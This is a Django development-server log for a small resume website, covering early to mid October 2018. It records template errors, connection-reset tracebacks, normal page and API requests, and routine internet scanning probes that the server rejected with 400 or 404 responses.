Internal Server Error: /
Traceback (most recent call last):
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 470, in parse
    compile_func = self.tags[command]
KeyError: 'frontend'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ubuntu/web-app-ci-cd-with-travis-ci-ZhimaoLin/webresume/frontend/views.py", line 6, in index
    return render(request, 'index.html', {})
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loader.py", line 15, in get_template
    return engine.get_template(template_name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/backends/django.py", line 34, in get_template
    return Template(self.engine.get_template(template_name), self)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/engine.py", line 144, in get_template
    template, origin = self.find_template(template_name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/engine.py", line 126, in find_template
    template = loader.get_template(name, skip=skip)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loaders/base.py", line 30, in get_template
    contents, origin, origin.template_name, self.engine,
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 156, in __init__
    self.nodelist = self.compile_nodelist()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 194, in compile_nodelist
    return parser.parse()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 472, in parse
    self.invalid_block_tag(token, command, parse_until)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 534, in invalid_block_tag
    "or load this tag?" % (token.lineno, command)
django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 9: 'frontend'. Did you forget to register or load this tag?
[01/Oct/2018 22:48:05] "GET / HTTP/1.1" 500 124944
[01/Oct/2018 22:52:09] "GET / HTTP/1.1" 200 1264
[01/Oct/2018 22:52:10] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 23:09:30] "GET / HTTP/1.1" 200 1264
[01/Oct/2018 23:09:30] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 23:09:31] "GET / HTTP/1.1" 200 1264
[01/Oct/2018 23:09:31] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:34:57] "GET / HTTP/1.1" 200 1264
[02/Oct/2018 01:34:57] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:39:59] "GET / HTTP/1.1" 200 1410
[02/Oct/2018 01:39:59] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:40:06] "GET / HTTP/1.1" 200 1410
[02/Oct/2018 01:40:06] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:43:30] "GET / HTTP/1.1" 200 1434
[02/Oct/2018 01:43:30] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:48:25] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:50:16] "GET / HTTP/1.1" 200 1459
[02/Oct/2018 01:50:16] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:52:36] "GET / HTTP/1.1" 200 1536
[02/Oct/2018 01:52:36] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:52:37] "GET / HTTP/1.1" 200 1536
[02/Oct/2018 01:52:38] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:53:40] "GET / HTTP/1.1" 200 1567
[02/Oct/2018 01:53:41] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:53:45] "GET / HTTP/1.1" 200 1567
[02/Oct/2018 01:53:45] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:53:46] "GET / HTTP/1.1" 200 1567
[02/Oct/2018 01:53:46] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:53:46] "GET / HTTP/1.1" 200 1567
[02/Oct/2018 01:53:47] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:53:49] "GET / HTTP/1.1" 200 1567
[02/Oct/2018 01:53:50] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:54:15] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:54:17] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:54:18] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:56:24] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:57:54] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 01:58:55] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:00:13] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:00:15] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:00:56] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:04:10] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:05:15] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:05:52] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:06:55] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:07:04] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:07:05] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:07:05] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:07:27] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:07:28] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:07:49] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:09:13] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:10:26] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:10:40] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:11:04] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:11:30] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:11:40] "GET / HTTP/1.1" 200 1567
[02/Oct/2018 02:11:40] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:11:57] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 02:11:57] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 02:14:30] "GET /image.jpg HTTP/1.1" 200 44969
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[02/Oct/2018 03:33:45] "GET / HTTP/1.0" 400 60115
[02/Oct/2018 06:58:54] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 06:58:55] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 06:59:05] "GET /image.jpg HTTP/1.1" 200 44969
Not Found: /status
[02/Oct/2018 14:47:41] "GET /status HTTP/1.1" 404 2535
[02/Oct/2018 17:03:30] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
[02/Oct/2018 17:03:30] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
[02/Oct/2018 20:13:43] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 20:13:43] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[02/Oct/2018 20:13:44] "GET /favicon.ico HTTP/1.1" 404 2550
[02/Oct/2018 20:15:04] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 20:15:06] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 20:15:07] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:17:10] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 21:17:10] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:18:36] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 21:18:37] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /index.html
[02/Oct/2018 21:18:39] "GET /index.html HTTP/1.1" 404 2547
[02/Oct/2018 21:23:04] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 21:23:05] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[02/Oct/2018 21:23:05] "GET /favicon.ico HTTP/1.1" 404 2550
[02/Oct/2018 21:45:42] "GET / HTTP/1.1" 200 1679
[02/Oct/2018 21:45:42] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:46:32] "GET / HTTP/1.1" 200 1507
[02/Oct/2018 21:46:32] "GET /static/style.css HTTP/1.1" 404 1657
[02/Oct/2018 21:46:32] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:46:41] "GET / HTTP/1.1" 200 1507
[02/Oct/2018 21:46:41] "GET /static/style.css HTTP/1.1" 404 1657
[02/Oct/2018 21:46:42] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:46:43] "GET / HTTP/1.1" 200 1507
[02/Oct/2018 21:46:43] "GET /static/style.css HTTP/1.1" 404 1657
[02/Oct/2018 21:46:43] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:46:44] "GET / HTTP/1.1" 200 1507
[02/Oct/2018 21:46:44] "GET /static/style.css HTTP/1.1" 404 1657
[02/Oct/2018 21:46:44] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:46:46] "GET / HTTP/1.1" 200 1507
[02/Oct/2018 21:46:46] "GET /static/style.css HTTP/1.1" 404 1657
[02/Oct/2018 21:46:46] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:47:32] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 21:47:32] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:47:34] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 21:47:34] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:47:35] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 21:47:35] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:47:36] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 21:47:36] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 21:47:49] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 21:47:49] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 22:27:00] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 22:27:00] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 22:28:26] "GET /image.jpg HTTP/1.1" 200 44969
Not Found: /text
[02/Oct/2018 22:28:57] "GET /text HTTP/1.1" 404 2529
Not Found: /helloworld
[02/Oct/2018 22:29:08] "GET /helloworld HTTP/1.1" 404 2547
Not Found: /helloworld.txt
[02/Oct/2018 22:29:10] "GET /helloworld.txt HTTP/1.1" 404 2559
[02/Oct/2018 22:29:14] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 22:29:15] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 22:37:43] "GET /hello-world.txt HTTP/1.1" 200 11
[02/Oct/2018 22:51:25] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 22:51:26] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 22:56:10] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 22:56:11] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 22:56:14] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 22:56:15] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 22:56:16] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 22:56:16] "GET /api/person/1/ HTTP/1.1" 200 231
[02/Oct/2018 23:00:05] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 23:03:24] "GET / HTTP/1.1" 200 1689
[02/Oct/2018 23:03:25] "GET /api/person/1/ HTTP/1.1" 200 231
Invalid HTTP_HOST header: '1.2.3.4:1234'. You may need to add '1.2.3.4' to ALLOWED_HOSTS.
Bad Request: /
[02/Oct/2018 23:41:39] "POST / HTTP/1.1" 400 60717
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[03/Oct/2018 03:23:34] "GET / HTTP/1.0" 400 60116
Not Found: /status
[03/Oct/2018 13:47:32] "GET /status HTTP/1.1" 404 2535
[03/Oct/2018 15:17:27] "GET / HTTP/1.1" 200 1689
[03/Oct/2018 15:17:27] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[03/Oct/2018 15:17:27] "GET /favicon.ico HTTP/1.1" 404 2550
[03/Oct/2018 19:37:31] "GET / HTTP/1.1" 200 1689
[03/Oct/2018 19:37:32] "GET /api/person/1/ HTTP/1.1" 200 231
[04/Oct/2018 07:30:56] code 400, message Bad request version ("\x00\x008À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
[04/Oct/2018 07:30:56] You're accessing the development server over HTTPS, but it only supports HTTP.

[04/Oct/2018 07:30:57] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x9c\x01\x00\x00\x98\x03\x03[µÁ±\x8e\x9e³«ÐNÄT%|S]')
[04/Oct/2018 07:30:57] You're accessing the development server over HTTPS, but it only supports HTTP.

[04/Oct/2018 19:11:10] "GET / HTTP/1.1" 200 1689
[04/Oct/2018 19:11:10] "GET /api/person/1/ HTTP/1.1" 200 231
[04/Oct/2018 19:55:53] "GET / HTTP/1.1" 200 1689
[04/Oct/2018 19:55:54] "GET /api/person/1/ HTTP/1.1" 200 231
[05/Oct/2018 03:46:32] "GET / HTTP/1.1" 200 1689
Not Found: /favicon.ico
[05/Oct/2018 03:46:33] "GET /favicon.ico HTTP/1.1" 404 2550
[05/Oct/2018 07:03:04] "GET / HTTP/1.1" 200 1689
[05/Oct/2018 07:03:06] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[05/Oct/2018 07:03:06] "GET /favicon.ico HTTP/1.1" 404 2550
[05/Oct/2018 21:44:01] "GET / HTTP/1.1" 200 1689
[05/Oct/2018 22:30:22] "GET / HTTP/1.1" 200 1689
[05/Oct/2018 23:12:56] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[05/Oct/2018 23:12:56] "  /*à     Cookie: mstshash=Administr" 400 -
[06/Oct/2018 07:19:51] "GET / HTTP/1.1" 200 1689
[06/Oct/2018 16:03:50] "GET / HTTP/1.1" 200 1689
Not Found: /HNAP1/
[06/Oct/2018 16:03:50] "GET /HNAP1/ HTTP/1.1" 404 2535
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[07/Oct/2018 02:06:39] "GET / HTTP/1.0" 400 60117
Not Found: /status
[07/Oct/2018 06:34:49] "GET /status HTTP/1.1" 404 2535
[07/Oct/2018 16:59:39] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[07/Oct/2018 20:04:20] "GET / HTTP/1.0" 400 60116
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[07/Oct/2018 23:04:45] "GET / HTTP/1.0" 400 60116
[08/Oct/2018 08:30:54] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[08/Oct/2018 08:30:54] "  /*à     Cookie: mstshash=Administr" 400 -
[08/Oct/2018 10:02:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
[08/Oct/2018 10:02:11] "  +&à     Cookie: mstshash=hello" 400 -
[08/Oct/2018 21:32:28] "GET / HTTP/1.1" 200 1689
[08/Oct/2018 21:55:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
[08/Oct/2018 21:55:18] "  +&à     Cookie: mstshash=hello" 400 -
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[09/Oct/2018 01:27:00] "GET / HTTP/1.1" 400 60118
[09/Oct/2018 01:44:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
[09/Oct/2018 01:44:33] "  +&à     Cookie: mstshash=hello" 400 -
[09/Oct/2018 12:21:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[09/Oct/2018 12:21:52] "  /*à     Cookie: mstshash=Administr" 400 -
[09/Oct/2018 13:25:51] "GET / HTTP/1.1" 200 1689
[09/Oct/2018 15:01:23] "GET / HTTP/1.1" 200 1689
Not Found: /favicon.ico
[09/Oct/2018 15:01:25] "GET /favicon.ico HTTP/1.1" 404 2550
[09/Oct/2018 15:01:25] "GET /api/person/1/ HTTP/1.1" 200 231
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[10/Oct/2018 15:24:13] "GET / HTTP/1.0" 400 60116
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[10/Oct/2018 18:26:11] "GET / HTTP/1.0" 400 60120
[10/Oct/2018 19:41:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[10/Oct/2018 19:41:11] "  /*à     Cookie: mstshash=Administr" 400 -
[10/Oct/2018 23:20:56] "GET / HTTP/1.1" 200 1689
[10/Oct/2018 23:23:20] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /favicon.ico
[10/Oct/2018 23:23:20] "GET /favicon.ico HTTP/1.1" 404 2550
[11/Oct/2018 04:38:08] "GET / HTTP/1.1" 200 1689
[11/Oct/2018 05:28:33] "GET / HTTP/1.1" 200 1689
[12/Oct/2018 02:53:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[12/Oct/2018 02:53:44] "  /*à     Cookie: mstshash=Administr" 400 -
Traceback (most recent call last):
  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
    self.handle()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.5/socket.py", line 575, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[12/Oct/2018 06:58:28] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[12/Oct/2018 17:20:12] "GET / HTTP/1.0" 400 60118
[12/Oct/2018 20:37:28] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[12/Oct/2018 20:37:28] "  /*à     Cookie: mstshash=Administr" 400 -
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[13/Oct/2018 11:42:27] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[13/Oct/2018 12:48:08] "GET / HTTP/1.0" 400 60119
[13/Oct/2018 13:11:37] "GET / HTTP/1.1" 200 1689
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[13/Oct/2018 15:51:55] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[13/Oct/2018 15:51:58] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[13/Oct/2018 15:51:59] "GET / HTTP/1.0" 400 60117
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /
[13/Oct/2018 15:57:01] "GET / HTTP/1.0" 400 60117
Traceback (most recent call last):
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
    result = self.stdout.write(data)
  File "/usr/lib/python3.5/socket.py", line 593, in write
    return self._sock.send(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[13/Oct/2018 15:57:01] "GET / HTTP/1.0" 500 59
Traceback (most recent call last):
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 463, in _write
    result = self.stdout.write(data)
  File "/usr/lib/python3.5/socket.py", line 593, in write
    return self._sock.send(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
    self.handle()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib/python3.5/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib/python3.5/wsgiref/simple_server.py", line 36, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
Not Found: /status
[13/Oct/2018 20:31:19] "GET /status HTTP/1.1" 404 2535
Traceback (most recent call last):
  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
    self.handle()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.5/socket.py", line 575, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[13/Oct/2018 22:39:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[13/Oct/2018 22:39:00] "  *%à     Cookie: mstshash=Test" 400 -
[13/Oct/2018 22:39:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[13/Oct/2018 22:39:01] "  *%à     Cookie: mstshash=Test" 400 -
[14/Oct/2018 01:14:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[14/Oct/2018 01:14:46] "  /*à     Cookie: mstshash=Administr" 400 -
[14/Oct/2018 09:56:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[14/Oct/2018 09:56:04] "  /*à     Cookie: mstshash=Administr" 400 -
[14/Oct/2018 09:59:09] "GET / HTTP/1.1" 200 1689
Traceback (most recent call last):
  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
    self.handle()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.5/socket.py", line 575, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[14/Oct/2018 12:22:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[14/Oct/2018 12:22:43] "  *%à     Cookie: mstshash=Test" 400 -
[14/Oct/2018 12:22:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[14/Oct/2018 12:22:43] "  *%à     Cookie: mstshash=Test" 400 -
[14/Oct/2018 18:19:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[14/Oct/2018 18:19:33] "  /*à     Cookie: mstshash=Administr" 400 -
[15/Oct/2018 00:39:38] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
[15/Oct/2018 00:39:38] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
[15/Oct/2018 05:46:33] "GET / HTTP/1.1" 200 1689
[15/Oct/2018 06:46:59] "GET / HTTP/1.1" 200 1689
[15/Oct/2018 10:58:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
[15/Oct/2018 10:58:19] "  +&à     Cookie: mstshash=hello" 400 -
[15/Oct/2018 12:41:22] "GET / HTTP/1.1" 200 1689
[15/Oct/2018 12:41:22] "GET / HTTP/1.1" 200 1689
[15/Oct/2018 12:41:23] "GET / HTTP/1.1" 200 1689
[15/Oct/2018 17:11:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[15/Oct/2018 17:11:06] "  /*à     Cookie: mstshash=Administr" 400 -
Traceback (most recent call last):
  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
    self.handle()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.5/socket.py", line 575, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[15/Oct/2018 21:47:23] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[15/Oct/2018 21:47:23] "  *%à     Cookie: mstshash=Test" 400 -
[15/Oct/2018 21:47:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
[15/Oct/2018 21:47:24] "  *%à     Cookie: mstshash=Test" 400 -
[15/Oct/2018 23:26:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[15/Oct/2018 23:26:45] "  /*à     Cookie: mstshash=Administr" 400 -
Invalid HTTP_HOST header: 'demo:8000'. You may need to add 'demo' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/nobody/Search.cgi
